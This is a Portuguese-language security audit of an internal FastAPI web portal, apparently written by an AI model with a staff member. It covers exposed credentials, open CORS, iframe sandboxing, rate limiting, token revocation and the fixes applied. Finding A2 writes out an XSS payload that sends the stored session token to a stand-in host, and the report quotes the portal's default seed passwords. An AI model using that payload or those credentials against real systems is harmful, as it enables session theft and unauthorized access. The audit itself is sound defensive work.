# Auditoria de Segurança — Hub SuperFrio & Icestar

**Data:** 2026-05-29
**Versão auditada:** 0.1.0 (POC, pré-deploy em VM Windows)
**Auditor:** Claude Opus 4.7 (assistido por Maria Watanabe — CSC SuperFrio)
**Escopo:** Backend FastAPI + frontend HTML/JS + Docker (Hub SuperFrio & Icestar completo)
**Modelo de ameaça:** Rede interna SuperFrio + Icestar (atacante já dentro da rede corporativa — funcionário curioso, estação comprometida, sniff de pacote no segmento)

---

## Sumário executivo

| Severidade | Encontrados | Resolvidos | Deferidos |
|---|---|---|---|
| Crítico | 3 | 3 | 0 |
| Alto    | 4 | 4 | 0 |
| Médio   | 4 | 4 | 0 |
| Baixo   | 2 | 0 | 2 |

Todos os itens críticos, altos e médios foram corrigidos e validados por smoke test antes do deploy em VM. Dois itens de baixa severidade foram mantidos com justificativa (ver seção *Deferidos*).

---

## Itens Críticos — Resolvidos

### C1. Credenciais seed expostas no HTML público de login
**Risco:** A tela de login listava literalmente `admin / admin123`, `operador.armazem / armazem123` e `analista.bo / backoffice123` para qualquer usuário que abrisse o portal. Em rede interna, isso é a "porta da frente" para invasão.

**Localização:** [`frontend/index.html`](frontend/index.html) (bloco `.login-hint`)

**Correção:** Bloco `.login-hint` removido. As credenciais seed só existem agora no código-fonte do `seed.py` (não exposto ao usuário final).

**Pendência operacional:** Em produção, a senha do `admin` deve ser trocada manualmente após o primeiro deploy via `POST /api/admin/usuarios/{id}/password`.

---

### C2. `SUPERFRIO_JWT_SECRET` caía para default sem aviso
**Risco:** A constante `JWT_SECRET = os.environ.get("SUPERFRIO_JWT_SECRET", "dev-secret-change-me")` retornava o default se a env não fosse setada. Como esse default está no repositório público (e na imagem Docker), qualquer pessoa com acesso ao código consegue forjar um JWT com `is_admin=true`.

**Localização:** [`backend/auth.py:11`](backend/auth.py#L11), [`docker-compose.yml:10`](docker-compose.yml#L10)

**Correção:**
- Variável de ambiente `SUPERFRIO_ENV` introduzida (`dev` por padrão).
- Quando `SUPERFRIO_ENV=prod` e o secret continua no default, o startup **falha com `RuntimeError`** — o container não sobe.
- Em `dev`, um `[WARN]` é impresso em `stderr`.
- `docker-compose.yml` expõe `SUPERFRIO_ENV` como variável configurável.

**Operação em prod:**
```powershell
# Gerar secret forte:
python -c "import secrets; print(secrets.token_hex(32))"

# Setar antes de subir:
$env:SUPERFRIO_JWT_SECRET = "<hex de 64 chars>"
$env:SUPERFRIO_ENV = "prod"
docker compose up -d
```

---

### C3. CORS totalmente aberto (`allow_origins=["*"]`)
**Risco:** `CORSMiddleware` aceitava requisições autenticadas de qualquer origem. Frontend e backend são servidos pelo mesmo host (FastAPI serve os estáticos), então não há motivo para CORS permissivo. Permitia que qualquer outro app interno comprometido fizesse requisições autenticadas se conseguisse extrair o token JWT.

**Localização:** [`backend/main.py:27-33`](backend/main.py#L27)

**Correção:** Middleware `CORSMiddleware` removido completamente. Como frontend e backend compartilham origem, CORS não é necessário. Em substituição, foi adicionado middleware de cabeçalhos de segurança (ver M4).

---

## Itens Altos — Resolvidos

### A1. Iframe com sandbox neutralizado (`allow-same-origin` + `allow-scripts`)
**Risco:** Os apps internos abertos via iframe usavam `sandbox="allow-same-origin allow-scripts allow-forms allow-popups"`. Essa combinação anula o sandbox — o iframe consegue acessar `parent.localStorage` e exfiltrar o token JWT. Como apps iframe são URLs internas SuperFrio, um único app comprometido (XSS, defacement) extrairia tokens de todos os usuários do portal.

**Localização:** [`frontend/index.html:183`](frontend/index.html#L183)

**Correção:** Atributo `allow-same-origin` removido. Sandbox final: `sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"`. O iframe ainda roda JS e submete formulários, mas não acessa o storage do portal.

**Impacto funcional esperado:** Apps embeddados que dependiam de cookies do portal para autenticação não funcionarão via iframe. Caso necessário, esses apps devem usar `tipo_acesso="url"` (abre em nova aba) ou implementar autenticação independente.

---

### A2. URL de app não validada — XSS via admin
**Risco:** O endpoint `POST/PATCH /api/admin/apps` aceitava qualquer string no campo `url`. Um admin malicioso poderia cadastrar `url: "javascript:fetch('http://evil/?t='+localStorage.sf_portal_token)"` e, ao usuário clicar no card, `window.open(url)` ou `iframe.src = url` executaria o esquema arbitrário. Escalada lateral de admin para XSS em todos os usuários.

**Localização:** [`backend/routers/admin.py`](backend/routers/admin.py) — endpoints `criar_app` e `atualizar_app`

**Correção:** Função `_check_url()` adicionada — rejeita com HTTP 400 qualquer URL que não comece com `http://` ou `https://`. Aplicada em ambos os endpoints (POST e PATCH).

**Validação:** POST com `url: "javascript:alert(1)"` retorna `400`.

---

### A3. Brute-force sem rate limit no `/api/auth/login`
**Risco:** Endpoint de login aceitava tentativas ilimitadas. Combinado com senhas seed previsíveis (`armazem123`, `backoffice123`) e bcrypt (~100ms/tentativa), um dicionário pequeno quebraria a senha em segundos a partir de qualquer máquina na rede.

**Localização:** [`backend/routers/auth.py`](backend/routers/auth.py)

**Correção:**
- Dependência `slowapi==0.1.9` adicionada ao `requirements.txt`.
- Instância única de `Limiter` em `backend/limiter.py`, compartilhada por `main.py` e `routers/auth.py` (importante: precisa ser a mesma instância para o decorador funcionar).
- Endpoint `/api/auth/login` decorado com `@limiter.limit("5/minute")` por IP.
- Handler global de `RateLimitExceeded` configurado em `main.py`.

**Validação:** 6ª tentativa de login dentro de 1 minuto retorna `429 Too Many Requests`.

---

### A4. JWT exp longo, sem revogação, token em `localStorage`
**Risco:** JWT com `exp=8h`, armazenado em `localStorage` (acessível por qualquer JS na mesma origem), sem mecanismo de invalidação server-side. Em caso de vazamento (XSS, exfiltração via iframe, sniff HTTP), o atacante teria janela de 8h sem que admin pudesse revogar.

**Localização:** [`backend/auth.py:13`](backend/auth.py#L13), [`frontend/js/app.js:52`](frontend/js/app.js#L52)

**Correção combinada:**
- `JWT_EXP_HOURS` reduzido de **8 → 3 horas**.
- Coluna `token_version INTEGER NOT NULL DEFAULT 1` adicionada à tabela `usuarios` ([`backend/database.py`](backend/database.py)) com ALTER idempotente para DBs existentes (`_ensure_column`).
- Login agora embute `tv=<token_version do user>` no payload do JWT.
- `get_current_user` valida que `payload["tv"] == row["token_version"]` — discrepância retorna 401.
- `POST /api/admin/usuarios/{id}/password` incrementa `token_version` na mesma transação que atualiza a hash — **todos os tokens do usuário em circulação ficam imediatamente inválidos**.

**Validação:** Token velho do `admin` testado após reset de senha do próprio admin → `GET /api/portal/home` retorna 401.

**Pendência operacional:** Para forçar logout global (ex: incidente), basta um SQL `UPDATE usuarios SET token_version = token_version + 1` — todos os tokens viram inválidos no próximo request.

---

## Itens Médios — Resolvidos

### M1. Container rodando como root
**Risco:** Defesa em profundidade. Sem `USER` no Dockerfile, uvicorn rodava como root dentro do container. Em caso de RCE em uma dependência (FastAPI, Pydantic, etc), o atacante já estaria root no container.

**Localização:** [`Dockerfile`](Dockerfile)

**Correção:**
- User `app` (uid=1000) criado no build.
- `gosu` instalado para drop de privilégios.
- Script [`entrypoint.sh`](entrypoint.sh) garante `chown app:app /app/data` antes de dropar root (necessário porque o bind mount `./data:/app/data` sobrescreve as permissões do build).
- `ENTRYPOINT ["/entrypoint.sh"]` + `CMD ["uvicorn", ...]` resulta em `uvicorn` rodando como uid=1000.

**Validação:** `cat /proc/1/status` dentro do container retorna `Uid: 1000 1000 1000 1000`. Healthcheck `healthy`. DB criado e gravável pelo user `app`.

---

### M2. Política de senha mínima fraca (4 caracteres)
**Risco:** O modelo `PasswordReset.senha = Field(min_length=4)` permitia senhas como `1234`. Com rate limit por IP, um atacante de múltiplas máquinas na rede ainda conseguiria brute-force em senhas de 4 dígitos.

**Localização:** [`backend/routers/admin.py`](backend/routers/admin.py) (criar_usuario, PasswordReset) + [`frontend/js/admin.js`](frontend/js/admin.js) (form de novo usuário, reset de senha, validação client-side)

**Correção:** Constante `PASSWORD_MIN_LEN = 8` no backend, refletida em:
- `Field(min_length=PASSWORD_MIN_LEN)` em `PasswordReset`
- Validação manual em `criar_usuario`
- `minlength="8"` nos dois `<input type="password">` do frontend
- Validação JS em `submitModal` (mode `password`)

**Validação:** POST `/api/admin/usuarios` com `senha: "1234"` retorna `400`; com `senha: "senhaforte123"` retorna `201`.

**Compatibilidade com seed:** As senhas seed (`admin123`, `armazem123`, `backoffice123`) têm 8+ caracteres — não quebra.

---

### M3. Captura de erros UNIQUE via `except Exception` + string match
**Risco:** Dívida técnica. Os endpoints de criação engoliam qualquer exceção (`except Exception as e`) e usavam `"UNIQUE" in str(e)` para distinguir conflito de slug. Erros não-relacionados (out-of-memory, lock contention, etc) seriam re-raised, mas o handler genérico esconde a intenção e dificulta o debug.

**Localização:** [`backend/routers/admin.py`](backend/routers/admin.py) — 4 INSERTs (secoes, apps, roles, usuarios)

**Correção:** `except Exception` substituído por `except sqlite3.IntegrityError` em todos os 4 lugares. A checagem de string `"UNIQUE" in str(e)` foi mantida para distinguir conflito de slug de outras violações de integridade (FK, NOT NULL).

---

### M4. Ausência de cabeçalhos HTTP de segurança
**Risco:** Defesa em profundidade contra XSS, clickjacking e MIME-sniffing. Mesmo com `escapeHtml` ubíquo no frontend, uma vulnerabilidade futura seria mitigada por cabeçalhos restritivos.

**Localização:** [`backend/main.py`](backend/main.py)

**Correção:** Middleware HTTP adicionado, envia em todas as respostas:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: same-origin`
- `Content-Security-Policy`:
  ```
  default-src 'self';
  script-src 'self';
  style-src 'self' https://fonts.googleapis.com 'unsafe-inline';
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data:;
  connect-src 'self';
  frame-src *;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
  ```

**Notas:**
- `'unsafe-inline'` em `style-src` é necessário porque o frontend usa `style="..."` inline (CSP estrito quebraria a UI atual).
- `frame-src *` permite embeddar qualquer app interno por iframe; restringir mais é viável quando a lista de domínios internos estiver consolidada.
- `frame-ancestors 'none'` impede que o portal seja embeddado em outro site (clickjacking).
- `connect-src 'self'` impede exfiltração via `fetch()` para domínios externos.

**Validação:** `GET /api/health` retorna os 4 cabeçalhos.

---

## Itens Baixos — Deferidos com justificativa

### B1. Tráfego sem HTTPS na VM
**Risco:** Login envia `username` + `password` em texto claro no POST. Qualquer atacante com `tcpdump`/Wireshark no segmento de rede captura credenciais.

**Justificativa do deferral:** Decisão de deploy, não de código. Requer:
- Certificado TLS (auto-assinado da CA interna SuperFrio ou Let's Encrypt se houver DNS público).
- Reverse proxy (nginx ou Traefik) na VM Windows, terminando TLS e proxy_pass para `127.0.0.1:8000`.
- Configuração de firewall: porta 443 aberta, 8000 bloqueada externamente.

**Recomendação:** **Bloqueante para deploy em produção.** A POC pode rodar em HTTP em ambiente de teste; o deploy real (mesmo interno) deve ter HTTPS.

---

### B2. SQL dinâmico em UPDATEs (sem vetor real hoje)
**Risco:** Os endpoints PATCH montam `UPDATE tabela SET k1 = ?, k2 = ?` com as chaves vindo de `body.model_dump(exclude_unset=True)`. Hoje **não há SQL injection** porque Pydantic restringe `k` aos campos definidos no modelo. Se um dia alguém:
- Trocar para `dict` plain;
- Adicionar `model_config = ConfigDict(extra='allow')`;
- Aceitar chaves dinâmicas do request;

o vetor se abre.

**Justificativa do deferral:** Refatorar para whitelist explícita por endpoint aumenta complexidade sem reduzir risco hoje. Documentar é suficiente.

**Mitigação documental:** Qualquer alteração nos modelos Pydantic em `admin.py` deve preservar a propriedade de que **as chaves vêm de um modelo fechado**, não de input do usuário.

---

## Smoke test final — evidências

Executado em `127.0.0.1:8000` (container Docker) após o último rebuild:

| Teste | Esperado | Observado | OK |
|---|---|---|---|
| `GET /api/health` | 200 + 4 headers de segurança | 200 + XCTO/XFO/Referrer-Policy/CSP presentes | ✅ |
| Login `admin/admin123` | 200 + token com `tv` no payload | 200, `tv=1` decodificado | ✅ |
| `GET /api/portal/home` com token válido | 200 + 2 seções | 200, 2 seções (Armazém + Backoffice) | ✅ |
| POST `/api/admin/apps` com `url:"javascript:alert(1)"` | 400 | 400 | ✅ |
| 7 logins em sequência (mesmo IP) | 5×401, depois 429 | 4×401 + 3×429 (1ª chamada bem-sucedida consumiu slot) | ✅ |
| POST `/api/admin/usuarios` com `senha:"1234"` | 400 | 400 | ✅ |
| POST `/api/admin/usuarios` com `senha:"senhaforte123"` | 201 | 201 | ✅ |
| Reset de senha do admin → tentativa com token velho | 401 (tv mudou de 1 → 2) | 401 | ✅ |
| `cat /proc/1/status` dentro do container | `Uid: 1000` | `Uid: 1000 1000 1000 1000` | ✅ |
| Docker healthcheck após startup | `healthy` | `healthy` | ✅ |

---

## Arquivos tocados na auditoria

### Backend
- [`backend/auth.py`](backend/auth.py) — secret check em prod, `JWT_EXP_HOURS=3`, validação de `tv` em `get_current_user`
- [`backend/database.py`](backend/database.py) — coluna `token_version`, helper `_ensure_column` para ALTER idempotente
- [`backend/limiter.py`](backend/limiter.py) — **novo**: instância única do `Limiter` slowapi
- [`backend/main.py`](backend/main.py) — remoção do CORS aberto, configuração do slowapi, middleware de security headers + CSP
- [`backend/routers/auth.py`](backend/routers/auth.py) — `@limiter.limit("5/minute")` no login, `tv` no payload
- [`backend/routers/admin.py`](backend/routers/admin.py) — `_check_url`, `PASSWORD_MIN_LEN=8`, incremento de `token_version` no reset de senha, `sqlite3.IntegrityError` específico

### Frontend
- [`frontend/index.html`](frontend/index.html) — remoção do `.login-hint`, sandbox iframe sem `allow-same-origin`, cache-bust `v=20260529s`
- [`frontend/js/admin.js`](frontend/js/admin.js) — `minlength=8` nos inputs de senha, mensagem de hint atualizada

### Deploy
- [`Dockerfile`](Dockerfile) — instalação do `gosu`, user `app` uid=1000, `ENTRYPOINT` script
- [`entrypoint.sh`](entrypoint.sh) — **novo**: chown do volume + `gosu app`
- [`docker-compose.yml`](docker-compose.yml) — variável `SUPERFRIO_ENV`
- [`requirements.txt`](requirements.txt) — `slowapi==0.1.9`

---

## Próximos passos recomendados

Antes do deploy em produção:

1. **Trocar a senha do `admin`** (e dos usuários seed) via `POST /api/admin/usuarios/{id}/password`.
2. **Gerar e configurar `SUPERFRIO_JWT_SECRET`** com 64 chars hexadecimais aleatórios.
3. **Definir `SUPERFRIO_ENV=prod`** no `.env` da VM — garante que o startup falha se o secret não foi trocado.
4. **Configurar HTTPS** via nginx ou Traefik (item B1).
5. **Liberar apenas porta 443** no firewall da VM para usuários da rede; manter `8000` bloqueada externamente.
6. **Backup do `data/portal.db`** após o primeiro seed em prod (contém as senhas hashadas e o `token_version` corrente).

Pós-deploy:

7. **Monitorar logs de 429** (tentativas de brute-force) — opcionalmente plugar em SIEM/syslog corporativo.
8. **Revisar lista de apps com `tipo_acesso=iframe`** — confirmar que continuam funcionais sem `allow-same-origin` no sandbox.
9. **Considerar restrição do `frame-src` na CSP** para a lista finita de domínios internos quando estabilizada.

---

*Documento gerado para fins de auditoria. Versão controlada pelo histórico Git do repositório.*
